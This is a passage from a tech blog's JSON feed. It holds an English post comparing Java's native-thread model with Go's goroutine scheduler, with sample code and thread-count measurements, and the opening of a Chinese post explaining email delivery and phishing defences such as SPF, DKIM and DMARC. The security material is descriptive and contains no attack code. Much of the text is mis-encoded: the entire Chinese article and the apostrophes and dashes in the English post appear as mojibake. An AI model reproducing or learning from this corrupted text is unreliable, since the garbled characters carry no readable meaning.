å‘¢ï¼Ÿ</p>\n</blockquote>\n",
      "date_published": "2021-07-05T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-en/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-en/",
      "title": "Javaâ€™s Thread Model and Golang Goroutine",
      "content_html": "<!-- summary -->\n<p>One of the most important features of Golang is its ability to handle high concurrency. And goroutine is the foundation to support high concurrency. This article will briefly explain how Javaâ€™s thread model and Golangâ€™s goroutine work in OS. And I believe you will be impressive in the principle behind goroutine. Letâ€™s go!</p>\n<!-- summary -->\n<h1 id=\"java-thread-model\"><a class=\"direct-link\" href=\"#java-thread-model\">#</a> Java ThreadÂ Model</h1>\n<p>Java uses native thread in OS. That is every Java thread mapping to one kernel thread. Java can not determine which thread would occupy the core, it is completely dependent on OSâ€™s scheduler.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/thread-model-os-thread.png\" alt=\"\"></p>\n<p>Below is a simple java code that creates 1000 threads and does nothing:</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>I run this code in my Linux VM and use ps command to monitor the number of threads. It shows that the Java process creates about 1018 threads (Java creates about 18 threads to maintain JVM system, like GC.)</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">102763</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">1018</span></code></pre>\n<p>However, with the advent of technology, it becomes more common for people to connect to the internet, we all want our server could support high concurrency to serve our customers. But the threadâ€Šâ€”â€Šever called lightweight processâ€Šâ€”â€Šbecomes too heavy to support high concurrency. Why?</p>\n<h2 id=\"problem-of-thread\"><a class=\"direct-link\" href=\"#problem-of-thread\">#</a> Problem ofÂ Thread</h2>\n<ol>\n<li>Memory size<br>\nEvery time Java creates a thread, Java would allocate a fixed memory size as that threadâ€™s stack. The number of threads would be limit by OSâ€™s memory and SWAP size, even if your Java application does not use that much memory.<br>\nYou can use -Xss JVM option to the specific memory size of the stack used by each thread. But JVM would not run up if you specify too small memory size. Take my laptop, for example, JVM would crash if I set memory size smaller than 135k.</li>\n<li>The Cost of Create Thread and Context Switch<br>\nWhen the number of threads exceeds the number of cores, OS would arrange core to run each thread as fairs as it can through the scheduler. When one core switches one thread to another thread, it would store the current threadâ€™s state, load another threadâ€™s state and run it. That is the so-called context switch.<br>\nBut one thing you must know is that context switch is also cost. If there are too many threads, your core would spend too much time in context switch. Thus it would decrease your systemâ€™s throughput.</li>\n</ol>\n<p>Letâ€™s see an actual example to show how expensive thread is. Below is a simple Java code, it uses ExecutorService with a fixed number thread pool to run the function doSomething 200000 times.</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">Random</span> random <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">int</span> anInt <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> threadNum <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span>threadNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">200000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">awaitTermination</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">.</span>MAX_VALUE<span class=\"token punctuation\">,</span> <span class=\"token class-name\">TimeUnit</span><span class=\"token punctuation\">.</span>NANOSECONDS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>I run the code with the number of threads from 100 to 9900 and record the time it runs:</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/measure-thread-loading.png\" alt=\"\"></p>\n<p>You can see that it take more time to finish the process if Java creates more thread. Let dig deep into what happened by profiling CPU. When the number of threads is set to 100, about 51% of CPU time is spent in function <strong>doSomething:</strong></p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-10.png\" alt=\"\"></p>\n<p>And we increase the number of threads to 9900, the CPU time spent in function <strong>doSomething</strong> is down to about 27%.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-990.png\" alt=\"\"></p>\n<p>All of the metrics tell us the cost of the thread makes Javaâ€™s thread model suffer in the high concurrency scenario.</p>\n<h1 id=\"how-goroutine\"><a class=\"direct-link\" href=\"#how-goroutine\">#</a> How Goroutine</h1>\n<p>Compare to Java, Golang does not use OSâ€™s native thread. Instead, Golang implements its scheduler, arrange goroutines to run spread between a fixed number of threads.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/go-scheduler-1.png\" alt=\"\"></p>\n<p>Every thread would switch one goroutine to another goroutine in about 10ms. And the basic police for a thread to pick a goroutine is:</p>\n<ol>\n<li>pick a goroutine from a FIFO per-thread local queue</li>\n<li>pick a goroutine from a global FIFO queue</li>\n<li>steal a goroutine from another threadâ€™s local queue (work-stealing)</li>\n</ol>\n<blockquote>\n<p>Golang uses GOMAXPROCS parameter to determine how many threads to use in Golang application. The default value is the number of cores.</p>\n</blockquote>\n<p>To be more specific, letâ€™s run the below go code and monitor the numbers of threads:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>It shows up that the number of threads is between 4~6.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">5</span></code></pre>\n<h2 id=\"goroutine%E2%80%99s-memory\"><a class=\"direct-link\" href=\"#goroutine%E2%80%99s-memory\">#</a> Goroutineâ€™s Memory</h2>\n<p>Golang would allocate 4k memory to goroutine in the very beginning. As Goroutine uses more and more memory, Golang would dynamically scale up the stack size. Thatâ€™s to say the number of goroutines is also bound by the size of memory, but not as suffer as Javaâ€™s thread.</p>\n<h2 id=\"blocking-system-call\"><a class=\"direct-link\" href=\"#blocking-system-call\">#</a> Blocking SystemÂ Call</h2>\n<p>Since goroutines are run between threads, what if a thread were blocked by a blocking system call, like file IO?</p>\n<p>Letâ€™s see the below graph, if three of four threads are blocked, would Golangâ€™s throughput be impacted because there was only one thread serve Goroutine?</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-1.png\" alt=\"\"></p>\n<p>The answer is NO. To solve this problem, Golang design processor to separate goroutine.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-2.png\" alt=\"\"></p>\n<p>If a thread was blocked by a system call, Golang would create a new thread and handoff the whole processor to the new thread. Thus the processor can keep serving goroutine, and the blocking thread could keep waiting system call to finish.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-3.png\" alt=\"\"></p>\n<p>Here is a simple Golang code, create 1000 goroutine to read big file:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tfi<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bigfile\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token keyword\">defer</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tbuf <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\tn<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> err <span class=\"token operator\">!=</span> io<span class=\"token punctuation\">.</span>EOF <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token keyword\">if</span> <span class=\"token number\">0</span> <span class=\"token operator\">==</span> n <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">break</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>After running it in my Linux VM, ps command show up that the number of threads increasing to 130~200:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">142</span></code></pre>\n<p>So that if you use lots of goroutine to call blocking system call, the concurrency may degrade as Javaâ€™s thread model.</p>\n<blockquote>\n<p>If you want to know more about goroutine schedulerï¼Œplease refer <a href=\"https://www.youtube.com/watch?v=-K11rY57K7k&amp;t=316s&amp;ab_channel=Hydra\">Go scheduler: Implementing language with lightweight concurrency</a>ã€‚</p>\n</blockquote>\n<h1 id=\"conclusion\"><a class=\"direct-link\" href=\"#conclusion\">#</a> Conclusion</h1>\n<p>So far we had discussed the challenge Javaâ€™s thread model meet in high concurrency scenario and how Golangâ€™ goroutine solve these issue. Does that mean Java is powerless in high concurrency?</p>\n<p>Of Course NO. There is an ongoing project name <a href=\"https://blogs.oracle.com/javamagazine/going-inside-javas-project-loom-and-virtual-threads\">Loom Project</a>, itâ€™s purpose is to implement a mechanism like goroutine in JVM. Maybe in the next Java LTS version, we could handle high concurrency in JVM gracefully, just like goroutine.</p>\n<p>By the way, what makes me feel interesting is that before Java 1.2, Java uses green thread which runs virtual thread on OS thread just like goroutine. But green thread suffers some performance issues in multi-core environment. Thatâ€™s why Java decide to use native afterJava 1.3.</p>\n<p>I wonder that if OS could provide some concurrency mechanism one day as goroutine does, would programing language switch to use native mechanism instead of implementing their scheduler?</p>\n",
      "date_published": "2021-07-05T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/",
      "title": "é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€ŠåŸç†ç¯‡",
      "content_html": "<!-- summary -->\n<!-- å¤§å®¶å¯èƒ½å¸¸å¸¸åœ¨æ–°èä¸Šçœ‹åˆ°æŸæŸå…¬å¸é­åˆ°é‡£é­šä¿¡ä»¶æ”»æ“Šï¼Œé§­å®¢ã€å½å†’å…¬å¸å“¡å·¥å¯„ä¿¡ã€é€ æˆå—å®³è€…ä¸Šç•¶çš„æ•…äº‹ã€‚ä¸ç®¡æ˜¯äº¤å‡ºå…§éƒ¨æœå‹™çš„å¸³è™Ÿå¯†ç¢¼ï¼Œé‚„æ˜¯ä¸‹è¼‰æƒ¡æ„è»Ÿé«”ä¸­æ¯’ï¼Œéƒ½æ˜¯å¾ˆåš´é‡çš„å¾Œæœï¼Œè®“æˆ‘å€‘ä¾†çœ‹çœ‹ email security æ˜¯ä»€éº¼ï¼Œåˆæœ‰å“ªäº›æ”»é˜²æ©Ÿåˆ¶å§ï¼ -->\n<!-- summary -->\n<p>å¤§å®¶å¯èƒ½å¸¸å¸¸åœ¨æ–°èä¸Šçœ‹åˆ°æŸæŸå…¬å¸é­åˆ°é‡£é­šä¿¡ä»¶æ”»æ“Šï¼Œé§­å®¢ã€å½å†’å…¬å¸å“¡å·¥å¯„ä¿¡ã€é€ æˆå—å®³è€…ä¸Šç•¶çš„æ•…äº‹ã€‚ä¸ç®¡æ˜¯äº¤å‡ºå…§éƒ¨æœå‹™çš„å¸³è™Ÿå¯†ç¢¼ï¼Œé‚„æ˜¯ä¸‹è¼‰æƒ¡æ„è»Ÿé«”ä¸­æ¯’ï¼Œéƒ½æ˜¯å¾ˆåš´é‡çš„å¾Œæœï¼Œæ‰€ä»¥å¸¸èªªè³‡å®‰æœ€è–„å¼±çš„ä¸€ç’°å°±æ˜¯äººçš„æ„è­˜å•Šï¼ˆå˜†ã€‚</p>\n<p>ä½†æ˜¯é‡£é­šä¿¡ä»¶é‚£éº¼çŒ–ç‹‚ï¼Œé›£é“å°±åªèƒ½ä¾é å—å®³è€…è‡ªå·±çš„æ„è­˜å—ï¼Ÿæ’‡é™¤ç”¨ç›¸ä¼¼çš„åŸŸåå¯„ä¿¡ï¼Œåƒæ˜¯ <a href=\"http://g1thu6.com\">g1thu6.com</a> æˆ– <a href=\"http://app1e.com\">app1e.com</a> çš„é€™ç¨®ä»”ç´°è§€å¯Ÿå°±èƒ½ç™¼ç¾ç«¯å€ªçš„æƒ…æ³ï¼Œå¦‚æœå¯„ä¿¡äººçš„åœ°å€çœŸçš„å¯«è‘— <a href=\"http://github.com\">github.com</a> è·Ÿ <a href=\"http://apple.com\">apple.com</a>ï¼Œæˆ‘è¦æ€éº¼åˆ¤æ–·æ˜¯ä¸æ˜¯é‡£é­šå•Šï¼Ÿå†è¬¹æ…çš„äººéƒ½æ²’è¼’å§ï¼Ÿ</p>\n<p>ç‚ºäº†è®“å¯„ä»¶æ–¹è² èµ·ä¸€é»è²¬ä»»ï¼Œä¹Ÿè®“æ”¶ä¿¡æ–¹æœ‰é©—è­‰éƒµä»¶çš„ä¾æ“šï¼Œæ–¼æ˜¯å‡ºç¾äº†ä¸‰ç¨®å¸¸è¦‹çš„é©—è­‰æ©Ÿåˆ¶ï¼šSPFã€DKIMã€DMARCã€‚ä½†åœ¨è¬›é€™ä¸‰ç¨®è¨­å®šå‰ï¼Œæˆ‘å€‘é¦–å…ˆè¦ç†è§£ä¸€å°éƒµä»¶å¾ç™¼ä¿¡äººå¯„å‡ºåˆ°æ”¶ä¿¡äººé»é–±ä¸­é–“ç¶“æ­·äº†å“ªäº›äº‹ã€‚</p>\n<hr>\n<h2 id=\"an-email%E2%80%99s-journey\"><a class=\"direct-link\" href=\"#an-email%E2%80%99s-journey\">#</a> An Emailâ€™sÂ Journey</h2>\n<p>æƒ³åƒä¸€ä¸‹ï¼Œå‡è¨­ä½ è¦å¯„ä¸€å°æ‰‹å¯«çš„å¡ç‰‡çµ¦é æ–¹çš„è¦ªå‹ï¼Œä½ æœƒæ€éº¼åšå‘¢ï¼Ÿ</p>\n<p>ä½ å¯èƒ½æœƒæ‹¿ä¸€å¼µç¨¿ç´™ï¼Œåœ¨é–‹é ­å…ˆå¯«ä¸Šã€è¦ªæ„›çš„Xï¼šã€ï¼Œæ¥è‘—æ–‡æƒ…ä¸¦èŒ‚åœ°å¯«å®Œå…§æ–‡ï¼Œåœ¨çµå°¾é™„è¨»ã€æ„›ä½ çš„ Oã€ï¼Œèªªä¸å®šé‚„æœƒå†åŠ ä¸Šç•¶å¤©çš„æ—¥æœŸã€‚ç„¶å¾Œï¼Œä½ å¯èƒ½æœƒæ‰¾ä¸€å€‹ä¹¾æ·¨çš„ä¿¡å°ï¼Œåœ¨å‰é¢å¯«ä¸Šè¦ªå‹çš„åå­—ä»¥åŠä½å€ï¼Œåœ¨èƒŒé¢å¯«ä¸Šè‡ªå·±çš„åœ°å€æˆ–æ˜¯éƒµå±€ä¿¡ç®±ä½ç½®ã€‚æœ€å¾Œï¼ŒæŠŠä¿¡ç´™æ”¾é€²ä¿¡å°è¢‹å¯†å°å¥½ã€è²¼ä¸Šéƒµç¥¨ä¸¦æŠ•å…¥ä¿¡ç®±ï¼Œç­‰ä»–ç¶“ééƒµå·®å…ˆç”Ÿå‚³éã€æœ€å¾Œè½åˆ°å°æ–¹çš„ä¿¡ç®±è£¡éœéœèººè‘—ã€‚</p>\n<p>å…¶å¯¦ä¸€å°é›»å­éƒµä»¶çš„æ—…ç¨‹ä¹Ÿå·®ä¸å¤šå¦‚æ­¤ã€‚å‡è¨­ä»Šå¤©æˆ‘è¦å¯„ä¸€å°é›»å­æ–°å¹´è³€å¡çµ¦çˆºçˆºæœƒç™¼ç”Ÿä»€éº¼äº‹å‘¢ï¼Ÿæˆ‘å€‘ç”¨ä¸‹é¢é€™å¼µåœ–ä¾†èªªæ˜ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/journey.png\" alt=\"mail's journey\"/><figcaption><p>Emailâ€™s journey ï¼ˆåƒè€ƒ <a href=\"https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc\">Mail Terminology</a>ï¼‰</p>\n</figcaption></figure></p>\n<p>é¦–å…ˆï¼Œæˆ‘æœƒåœ¨ç¶²é ä¸Šç™»å…¥æˆ‘çš„ gmail ï¼Œæ­¤æ™‚ã€ç¶²é ç‰ˆ gmail ã€é€™å€‹æ‡‰ç”¨ç¨‹å¼å°±æ‰®æ¼”è‘—åœ–å·¦ä¸Šè§’å¯«è‘— Mail User Agentï¼ˆMUAï¼‰çš„è§’è‰²ï¼Œæ˜¯ä½¿ç”¨è€…ç›´æ¥äº’å‹•ã€æ“ä½œçš„ä»‹é¢ã€‚ç•¶æˆ‘å¯«å¥½ä¿¡ä¹‹å¥½æŒ‰ä¸‹å¯„å‡ºï¼ŒMUA å°±æœƒæŠŠæˆ‘å¯«çš„å…§æ–‡ï¼ˆbodyï¼‰å‰é¢åŠ ä¸Šä¸€äº› headerï¼ŒåŒ…å«å¯„ä¿¡äººï¼ˆ<code>header.From</code>ï¼‰ã€æ”¶ä»¶äººï¼ˆ<code>header.To</code>ï¼‰ã€<code>header.Reply-To</code>ã€<code>header.BCC</code>ã€<code>header.CC</code>ã€æ—¥æœŸç­‰ç­‰è³‡è¨Šã€‚</p>\n<p>å¦‚æœä½ é»é–‹ä¿¡ä»¶çš„åŸå§‹è³‡è¨Šï¼Œæœƒçœ‹åˆ°é¡ä¼¼ä¸‹é¢é€™ä¸€å¼µåœ–çš„å…§å®¹ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/header.png\" /><figcaption><p>Header çš„ä¸€å°éƒ¨åˆ†</p>\n</figcaption></figure></p>\n<p>ç•¶ MUA æŠŠä¿¡åŒ…è£å¥½å¾Œï¼Œå°±æœƒé€šé SMTPï¼ˆSimple Mail Transfer Protocolï¼‰é€™å€‹å”å®šé€²è¡Œèº«ä»½é©—è­‰ä¸¦æŠŠä¿¡åŒ…åœ¨ä¸€å€‹ä¿¡å°è¢‹ï¼ˆSMTP envelopeï¼‰ä¸­äº¤çµ¦ email serverã€‚é€™è£¡æˆ‘ç”¨çš„æ˜¯ gmailï¼Œä»¥ä¸Šåœ–ä¾†èªªé»ƒè‰²çš„ sender server å°±æ˜¯ä¸€å° gmail serverã€‚åœ¨ email server ä¸­ï¼Œé¦–å…ˆæœƒé€åˆ°åœ¨ port 587 çš„ Mail Submission Agentï¼ˆMSAï¼‰ï¼Œåœ¨é€™è£¡é€²è¡Œä¸€äº›éƒµä»¶å¯©æŸ¥èˆ‡å‹˜èª¤ã€‚å¯©æŸ¥çš„åŠŸèƒ½å¸¸ç”¨æ–¼ç¢ºä¿ç¬¦åˆ AD è¨­å®šçš„ policyï¼Œä¾‹å¦‚æ‹’çµ•éåŒç¶²åŸŸçš„æ”¶ä¿¡åœ°å€ã€æˆ–æ˜¯æœªç¶“å¸³å¯†é©—è­‰çš„å¯„ä»¶äººç­‰ç­‰ã€‚å‹˜èª¤çš„éƒ¨åˆ†å‰‡æ˜¯æœƒæª¢æŸ¥æ˜¯å¦ç¼ºå°‘æŸäº› header æ¬„ä½æˆ–æ˜¯æœ‰æ ¼å¼ä¸æ­£ç¢ºçš„åœ°æ–¹ã€‚</p>\n<p>ç¢ºå®šä¿¡ä»¶æº–å‚™å¥½é€å‡ºï¼Œå°±æœƒé€åˆ°è·‘åœ¨ port 25 ä¸Šçš„ Mail Transfer Agentï¼ˆMTAï¼‰é€™è£¡ã€‚MTA å°±æ˜¯éƒµå·®çš„è§’è‰²ï¼Œè² è²¬çš„å·¥ä½œæ˜¯é€é DNS æŸ¥è©¢æ”¶ä¿¡äººç¶²åŸŸçš„ MX ç´€éŒ„æ‰¾åˆ°å°æ‡‰çš„ IPï¼Œç„¶å¾Œå‚³é€å‡ºå»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒMTA ä¸¦ä¸å°ˆæŒ‡åœ¨ sender æˆ– receiver ç«¯ email server ä¸­é‹è¡Œçš„ç¨‹å¼ï¼Œä»–åœ¨æ¦‚å¿µä¸Šé¡ä¼¼ router ï¼Œæ˜¯è² è²¬æ‰¾å‡ºä¸‹ä¸€å€‹ email server ä½ç½®ä¸¦å¯¦éš›å‚³è¼¸ï¼ˆrelayï¼‰çš„è»Ÿé«”ã€‚æ‰€ä»¥é›–ç„¶ä¸Šåœ–ä¸­ç›´æ¥æŠŠå·¦é‚Š sender email server æŒ‡åˆ°å³é‚Š receiver email serverï¼Œä½†ä¸­é–“å‚³è¼¸éç¨‹ä¸­æ˜¯å¯èƒ½ç¶“éå¤šå€‹ MTA çš„ã€‚å¦å¤–ï¼ŒMSA èˆ‡ MTA é€šå¸¸åŒæ™‚é‹ä½œåœ¨åŒä¸€å°ä¸»æ©Ÿä¸Šï¼Œä¸éæŸäº›æ¯”è¼ƒè€çš„ email 